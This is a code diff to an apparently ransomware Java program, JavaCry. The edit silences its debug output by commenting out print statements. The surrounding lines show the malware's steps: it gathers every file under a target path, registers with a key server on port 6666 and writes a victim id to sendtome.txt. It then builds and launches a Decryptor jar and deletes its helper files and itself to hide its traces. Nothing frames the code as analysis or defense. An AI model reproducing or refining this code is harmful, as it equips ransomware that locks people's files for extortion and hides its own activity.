@@ -45,7 +45,7 @@ public class JavaCry {
 
             } else {
                 //split to get file extension
-                System.out.println(name);
+                // System.out.println(name);
                 if (!name.equals("JavaCry.jar")) {
                     files.add(f.toPath());
                 }
@@ -101,7 +101,7 @@ public class JavaCry {
     }
 
     public static void main(String[] args) {
-        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
+        // System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD
         String h = ""; // id hash to write to sendtome.txt
 
         KeyClient key_client = new KeyClient(addr, 6666);
@@ -178,7 +178,7 @@ public class JavaCry {
                     File f = new File(targetPath);
                     targetPath = f.getAbsolutePath();
                 }
-                System.out.println("Searching " + targetPath);
+                // System.out.println("Searching " + targetPath);
                 search(targetPath);
             } catch (Exception e) {
                 System.out.println(e);
@@ -186,7 +186,7 @@ public class JavaCry {
 
 
 
-            System.out.println(files);
+            // System.out.println(files);
 
             // // avoid certain directories
             // for (int i = 0; i < files.size(); i++) {
@@ -245,10 +245,10 @@ public class JavaCry {
                 writer.write(h);
                 writer.close();
 
-                System.out.println("fetch loading.gif");
+                // System.out.println("fetch loading.gif");
                 // File loadingImg = new File("/img/loading.gif");
                 InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
-                System.out.println(Paths.get("loading.gif"));
+                // System.out.println(Paths.get("loading.gif"));
                 Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);
                 /*
                  * =========================================================
@@ -256,7 +256,7 @@ public class JavaCry {
                  * =========================================================
                  */
 
-                System.out.println("build decryptor");
+                // System.out.println("build decryptor");
                 process = Runtime.getRuntime()
                         .exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                 BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -264,19 +264,19 @@ public class JavaCry {
                 String str;
 
                 while ((str = b.readLine()) != null) {
-                    System.out.println(str);
+                    ;
                 }
 
                 b.close();
 
-                System.out.println("make jar file");
+                // System.out.println("make jar file");
                 process = Runtime.getRuntime().exec(String.format(
                         "jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class Decryptor$2.class ClientThread.class loading.gif",
                         System.getProperty("user.home")));
                 b = new BufferedReader(new InputStreamReader(process.getInputStream()));
 
                 while ((str = b.readLine()) != null) {
-                    System.out.println(str);
+                    ;
                 }
 
                 b.close();
@@ -287,66 +287,66 @@ public class JavaCry {
                  */
 
                 if (f.delete()) {
-                    System.out.println("Deleted the file: " + f.getName());
+                    // System.out.println("Deleted the file: " + f.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 if (m.delete()) {
-                    System.out.println("Deleted the file: " + m.getName());
+                    // System.out.println("Deleted the file: " + m.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 File classFile = new File("Decryptor.class");
 
                 if (classFile.delete()) {
-                    System.out.println("Deleted the file: " + classFile.getName());
+                    // System.out.println("Deleted the file: " + classFile.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 File helperFile = new File("Decryptor$1.class");
 
                 if (helperFile.delete()) {
-                    System.out.println("Deleted the file: " + helperFile.getName());
+                    // System.out.println("Deleted the file: " + helperFile.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 helperFile = new File("ClientThread.class");
                 if (helperFile.delete()) {
-                    System.out.println("Deleted the file: " + helperFile.getName());
+                    // System.out.println("Deleted the file: " + helperFile.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 helperFile = new File("Decryptor$2.class");
                 if (helperFile.delete()) {
-                    System.out.println("Deleted the file: " + helperFile.getName());
+                    // System.out.println("Deleted the file: " + helperFile.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 File loadingImg = new File("loading.gif");
                 if (loadingImg.delete()) {
-                    System.out.println("Deleted the file: " + loadingImg.getName());
+                    // System.out.println("Deleted the file: " + loadingImg.getName());
                 }
 
                 else {
-                    System.out.println("Failed to delete the file.");
+                    // System.out.println("Failed to delete the file.");
                 }
 
                 self = new File("JavaCry.jar");
@@ -355,7 +355,7 @@ public class JavaCry {
                     self.delete();
                 }
 
-                System.out.println("Done, running Decryptor");
+                // System.out.println("Done, running Decryptor");
 
                 /*
                  * =========================================================
